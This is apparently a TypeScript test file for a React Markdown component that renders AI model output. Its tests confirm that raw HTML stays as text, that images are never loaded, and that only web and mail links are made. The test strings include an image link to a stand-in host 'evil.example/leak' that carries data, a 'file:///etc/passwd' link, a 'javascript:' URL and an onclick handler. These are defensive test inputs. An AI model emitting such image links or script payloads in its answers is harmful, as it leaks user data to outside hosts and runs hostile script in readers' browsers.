import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';

import { LocaleProvider } from '@/shared/i18n';

import { Markdown } from './Markdown';

const draw = (text: string, streaming = false) =>
  render(
    <LocaleProvider locale="ko">
      <Markdown text={text} streaming={streaming} />
    </LocaleProvider>,
  ).container;

describe('Markdown', () => {
  afterEach(cleanup);

  it('draws lists, tables and code in our elements', () => {
    const container = draw(
      '- 하나\n- 둘\n\n| 파일 | 바뀐 것 |\n|---|---|\n| a.ts | 고침 |\n\n```ts\nconst a = 1;\n```',
    );
    expect(container.querySelectorAll('li')).toHaveLength(2);
    expect(screen.getByRole('table')).toBeTruthy();
    expect(screen.getByText('ts')).toBeTruthy();
    expect(container.querySelector('pre')?.textContent).toBe('const a = 1;');
  });

  it('keeps HTML the model wrote as text', () => {
    const container = draw('버튼은 <button onclick="x()">여기</button> 이렇게 써요');
    expect(container.querySelector('button[onclick]')).toBeNull();
    expect(container.querySelector('script, iframe')).toBeNull();
    expect(container.textContent).toContain('<button onclick="x()">여기</button>');
  });

  it('never loads an image, and offers it as a link instead', () => {
    const container = draw('![비밀](https://evil.example/leak?d=abc)');
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: '이미지: 비밀' }).getAttribute('href')).toBe(
      'https://evil.example/leak?d=abc',
    );
  });

  it('makes links only of web pages and mail', () => {
    draw('[문서](https://example.com) [파일](file:///etc/passwd) [스크립트](javascript:alert(1))');
    expect(screen.getAllByRole('link').map((a) => a.textContent)).toEqual(['문서']);
    expect(screen.getByText('파일')).toBeTruthy();
  });

  it('closes what is still open while streaming', () => {
    const container = draw('**굵게 쓰는 중', true);
    expect(container.textContent).not.toContain('**');
  });
});
